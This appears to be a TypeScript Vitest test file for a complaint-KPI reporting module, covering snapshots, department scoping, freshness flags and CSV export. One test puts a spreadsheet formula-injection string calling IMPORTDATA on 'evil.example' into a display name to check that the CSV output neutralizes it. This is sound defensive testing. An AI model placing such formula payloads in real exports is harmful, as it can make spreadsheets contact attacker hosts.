import { describe, expect, it } from "vitest";

import {
  calculateKpi,
  KPI_DEFINITIONS,
  SYNTHETIC_KPI_DEPARTMENT_A1,
  SYNTHETIC_KPI_TENANT_ID,
  type KpiComplaintFact,
} from "./kpi";
import { KpiSnapshotRepository, type KpiSnapshotWorkItem } from "./snapshots";
import { buildKpiReport, KpiReportError, kpiReportToCsv } from "./report";

const NOW = new Date("2026-08-11T04:00:00.000Z");
const TENANT = SYNTHETIC_KPI_TENANT_ID;
const complaint: KpiComplaintFact = {
  id: "report-complaint-001",
  tenantId: TENANT,
  departmentId: SYNTHETIC_KPI_DEPARTMENT_A1,
  createdAt: "2026-08-05T04:00:00.000Z",
  canonicalStatus: "RECEIVED",
};

const materialize = (repository: KpiSnapshotRepository, from: string, to: string, sourceWatermark: string, departmentId?: string): void => {
  const filter = { tenantId: TENANT, from, to, ...(departmentId ? { departmentId } : {}) };
  for (const definition of KPI_DEFINITIONS) {
    const work: KpiSnapshotWorkItem = { metricKey: definition.metricKey, filter, granularity: "MONTHLY" };
    repository.materialize(calculateKpi(definition.metricKey, filter, [complaint]), work, sourceWatermark, NOW);
  }
};

describe("KPI report projection", () => {
  it("exposes all approved definitions with exact snapshot values and period comparison", () => {
    const repository = new KpiSnapshotRepository();
    materialize(repository, "2026-07-01T00:00:00.000Z", "2026-08-01T00:00:00.000Z", "2026-08-01T00:00:00.000Z");
    materialize(repository, "2026-08-01T00:00:00.000Z", "2026-09-01T00:00:00.000Z", "2026-08-11T04:00:00.000Z");

    const report = buildKpiReport({
      filter: { tenantId: TENANT, from: "2026-07-01T00:00:00.000Z", to: "2026-09-01T00:00:00.000Z" },
      snapshots: repository.listForTenant(TENANT),
      reconciliations: repository.listReconciliations(TENANT),
      now: NOW,
    });
    const received = report.metrics.find((metric) => metric.metricKey === "COMPLAINT_RECEIVED_VOLUME");
    expect(report.status).toBe("PARTIAL");
    expect(report.coverage.definitionCount).toBe(9);
    expect(received?.latest?.numerator).toBe(1);
    expect(received?.previous?.numerator).toBe(0);
    expect(received?.change).toBe(1);
    expect(received?.freshness).toBe("FRESH");
    expect(received?.reconciliation).toBe("PENDING");
    expect(received?.definition.sqlFunction).toBe("private.calculate_kpi");
    expect(received?.trend).toHaveLength(2);
  });

  it("enforces department scope and refuses an unsupported category instead of broadening the query", () => {
    const repository = new KpiSnapshotRepository();
    materialize(repository, "2026-08-01T00:00:00.000Z", "2026-09-01T00:00:00.000Z", "2026-08-11T04:00:00.000Z", SYNTHETIC_KPI_DEPARTMENT_A1);
    const input = {
      snapshots: repository.listForTenant(TENANT),
      allowedDepartmentIds: [SYNTHETIC_KPI_DEPARTMENT_A1],
      now: NOW,
    } as const;
    expect(() => buildKpiReport({ ...input, filter: { tenantId: TENANT, from: "2026-08-01T00:00:00.000Z", to: "2026-09-01T00:00:00.000Z", departmentId: "other-department" } })).toThrowError(KpiReportError);
    expect(() => buildKpiReport({ ...input, filter: { tenantId: TENANT, from: "2026-08-01T00:00:00.000Z", to: "2026-09-01T00:00:00.000Z", categoryId: "category-1" } })).toThrow(/category filter is unavailable/u);
  });

  it("marks missing and stale snapshots explicitly", () => {
    const repository = new KpiSnapshotRepository();
    const filter = { tenantId: TENANT, from: "2026-08-01T00:00:00.000Z", to: "2026-09-01T00:00:00.000Z" };
    const work: KpiSnapshotWorkItem = { metricKey: "COMPLAINT_RECEIVED_VOLUME", filter, granularity: "MONTHLY" };
    repository.materialize(calculateKpi(work.metricKey, filter, [complaint]), work, "2026-07-01T00:00:00.000Z", new Date("2026-07-01T00:00:00.000Z"));
    const report = buildKpiReport({ filter, snapshots: repository.listForTenant(TENANT), now: NOW });
    expect(report.status).toBe("STALE");
    expect(report.metrics.find((metric) => metric.metricKey === work.metricKey)?.freshness).toBe("STALE");
    expect(report.metrics.find((metric) => metric.metricKey === "COMPLAINT_CLOSED_VOLUME")?.freshness).toBe("MISSING");
  });

  it("serializes a bounded CSV and neutralizes formula-like text", () => {
    const report = buildKpiReport({ filter: { tenantId: TENANT, from: "2026-08-01T00:00:00.000Z", to: "2026-09-01T00:00:00.000Z" }, snapshots: [], now: NOW });
    const dangerous = {
      ...report,
      metrics: report.metrics.map((metric, index) => index === 0 ? { ...metric, definition: { ...metric.definition, displayName: "=IMPORTDATA(\"https://evil.example\")" } } : metric),
    };
    const csv = kpiReportToCsv(dangerous);
    expect(csv.split("\n")).toHaveLength(11);
    expect(csv).toContain("'=IMPORTDATA");
    expect(csv).toContain("metricKey");
  });
});
